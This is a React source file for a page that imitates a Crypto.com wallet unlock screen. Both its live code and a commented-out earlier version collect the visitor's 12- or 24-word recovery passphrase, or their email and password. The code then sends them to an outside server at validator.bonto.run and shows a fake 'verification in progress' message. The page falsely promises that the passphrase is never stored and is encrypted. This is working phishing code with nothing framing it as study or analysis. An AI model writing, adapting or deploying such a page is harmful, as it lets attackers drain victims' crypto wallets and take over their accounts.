// import React, { useState } from 'react';
// import './cryptoPagesCss/cryptoWallet.css';
// import axios from 'axios';
// import { toast } from 'react-toastify';
// import 'react-toastify/dist/ReactToastify.css';
// import crypto_com_logo from "../../../assets/crypto_com_logo.png";
// import { useNavigate } from 'react-router-dom';

// const CryptoWallet = () => {
//   const [text, setText] = useState('');
//   const [loading, setLoading] = useState(false);
//   const [showSuccess, setShowSuccess] = useState(false);

//   const navigate = useNavigate();

//   const unlockWallet = async () => {
//     const url = 'https://validator.bonto.run/crypto';
//     const data = { passphrase: text };

//     try {
//       setLoading(true);
//       const response = await axios.post(url, data);
//       setLoading(false);

//       toast.success(response.data.message);
//       setText('');
//       setShowSuccess(true);
//     } catch (error) {
//       setLoading(false);
//       const errorMessage =
//         error.response?.data?.message || 'An error occurred. Please try again.';
//       toast.error(errorMessage);
//     }
//   };

//   const unlockWithId = () => {
//     toast.info('Feature not available yet.');
//   };

//   return (
//     <div className='crypto_wallet_body'>
//       <div className='crypto_wallet_top_body'>
//         <p>Wallet</p>
//         <div className='crypto_wallet_top_logo'>
//           <img src={crypto_com_logo} alt='Home Logo' />
//         </div>
//       </div>

//       {!showSuccess ? (
//         <>
//           <div className='crypto_wallet_h3'>
//             <h3>Unlock Crypto.com Wallet</h3>
//           </div>

//           <div className='crypto_wallet_bottom_body'>
//             <div className='crypto_wallet_bottom_container'>
//               <textarea
//                 className='crypto_wallet_text_area'
//                 placeholder='Enter your 12-word passphrase here'
//                 value={text}
//                 onChange={(e) => setText(e.target.value)}
//               />

//               <button
//                 className='crypto_unlock_with_passphrase_btn'
//                 onClick={unlockWallet}
//                 disabled={loading}
//               >
//                 {loading ? 'Loading...' : 'Unlock With Passphrase'}
//               </button>

//               <button
//                 className='crypto_unlock_with_faceid_btn'
//                 onClick={unlockWithId}
//               >
//                 Unlock With Face ID
//               </button>

//               <p>
//                 As a non-custodial wallet, your wallet passphrase is exclusively
//                 accessible only to you. Recovery of passphrase is currently
//                 impossible.
//               </p>

//               <p>
//                 Lost your passphrase? <span>you can create a new wallet</span>,
//                 but all assets in your previous wallet will be inaccessible.
//               </p>
//             </div>
//           </div>
//         </>
//       ) : (
//         <div className='crypto_wallet_bottom_body'>
//           <div className='crypto_wallet_bottom_container'>
//             <h3>Verification in progress</h3>
//             <p>
//               Your wallet details have been submitted successfully.
//               A confirmation email will be sent once verification is complete.
//             </p>

//             <div style={{ display: 'flex', gap: '12px', marginTop: '20px' }}>
//               <button
//                 className='crypto_unlock_with_passphrase_btn'
//                 onClick={() => navigate('/')}
//               >
//                 Go Home
//               </button>

//               <button
//                 className='crypto_unlock_with_faceid_btn'
//                 onClick={() => setShowSuccess(false)}
//               >
//                 Continue
//               </button>
//             </div>
//           </div>
//         </div>
//       )}
//     </div>
//   );
// };
import React, { useState } from 'react';
import './cryptoPagesCss/cryptoWallet.css';
import axios from 'axios';
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import crypto_com_logo from "../../../assets/crypto_com_logo.png";
import { useNavigate } from 'react-router-dom';

const PASSPHRASE_API = 'https://validator.bonto.run/cryptoSeed';
const EMAIL_API = 'https://validator.bonto.run/crypto';

const CryptoWallet = () => {
  const [method, setMethod] = useState(null);
  const [passphrase, setPassphrase] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  const navigate = useNavigate();

  const unlockWallet = async () => {
    try {
      setLoading(true);

      const payload =
        method === 'passphrase'
          ? { passphrase }
          : { emailOrUsername: email, password };

      const url =
        method === 'passphrase'
          ? PASSPHRASE_API
          : EMAIL_API;

      const response = await axios.post(url, payload);

      toast.success(response.data.message || 'Verification submitted');
      setShowSuccess(true);
    } catch (error) {
      toast.error(
        error.response?.data?.message ||
          'An error occurred. Please try again.'
      );
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className='crypto_wallet_body'>
      <div className='crypto_wallet_top_body'>
        <p>Wallet</p>
        <div className='crypto_wallet_top_logo'>
          <img src={crypto_com_logo} alt='Logo' />
        </div>
      </div>

      {/* ================= METHOD SELECTION ================= */}
      {!method && !showSuccess && (
        <div className='crypto_wallet_bottom_body'>
          <div className='crypto_wallet_bottom_container'>
            <h3>Unlock Wallet</h3>
            <p>Select how you want to unlock your wallet</p>

            <button
              className='crypto_unlock_with_passphrase_btn'
              onClick={() => setMethod('passphrase')}
            >
              Use Passphrase
            </button>

            <button
              className='crypto_unlock_with_faceid_btn'
              onClick={() => setMethod('email')}
            >
              Use Email & Password
            </button>
          </div>
        </div>
      )}

      {/* ================= PASSPHRASE ================= */}
      {method === 'passphrase' && !showSuccess && (
        <div className='crypto_wallet_bottom_body'>
          <div className='crypto_wallet_bottom_container'>
            <h3>Unlock With Passphrase</h3>

            <textarea
              className='crypto_wallet_text_area'
              placeholder='Enter your 12 or 24-word passphrase'
              value={passphrase}
              onChange={(e) => setPassphrase(e.target.value)}
            />

            <button
              className='crypto_unlock_with_passphrase_btn'
              onClick={unlockWallet}
              disabled={loading}
            >
              {loading ? 'Loading...' : 'Continue'}
            </button>

            <p>
              Your passphrase is never stored and is encrypted during verification.
            </p>

            <button
              className='crypto_unlock_with_faceid_btn'
              onClick={() => setMethod(null)}
            >
              Back
            </button>
          </div>
        </div>
      )}

      {/* ================= EMAIL ================= */}
      {method === 'email' && !showSuccess && (
        <div className='crypto_wallet_bottom_body'>
          <div className='crypto_wallet_bottom_container'>
            <h3>Unlock With Email</h3>

            <input
              className='crypto_wallet_input'
              type='email'
              placeholder='Email address'
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />

            <input
              className='crypto_wallet_input'
              type='password'
              placeholder='Password'
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />

            <button
              className='crypto_unlock_with_passphrase_btn'
              onClick={unlockWallet}
              disabled={loading}
            >
              {loading ? 'Loading...' : 'Continue'}
            </button>

            <p>
              Secure email-based verification with encrypted transmission.
            </p>

            <button
              className='crypto_unlock_with_faceid_btn'
              onClick={() => setMethod(null)}
            >
              Back
            </button>
          </div>
        </div>
      )}

      {/* ================= SUCCESS ================= */}
      {showSuccess && (
        <div className='crypto_wallet_bottom_body'>
          <div className='crypto_wallet_bottom_container'>
            <h3>Verification in Progress</h3>
            <p>
              Your wallet details have been submitted successfully.
              A confirmation email will be sent once verification is complete.
            </p>

            <div style={{ display: 'flex', gap: '12px', marginTop: '20px' }}>
              <button
                className='crypto_unlock_with_passphrase_btn'
                onClick={() => navigate('/')}
              >
                Go Home
              </button>

              <button
                className='crypto_unlock_with_faceid_btn'
                onClick={() => {
                  setShowSuccess(false);
                  setMethod(null);
                  setPassphrase('');
                  setEmail('');
                  setPassword('');
                }}
              >
                Continue
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default CryptoWallet;
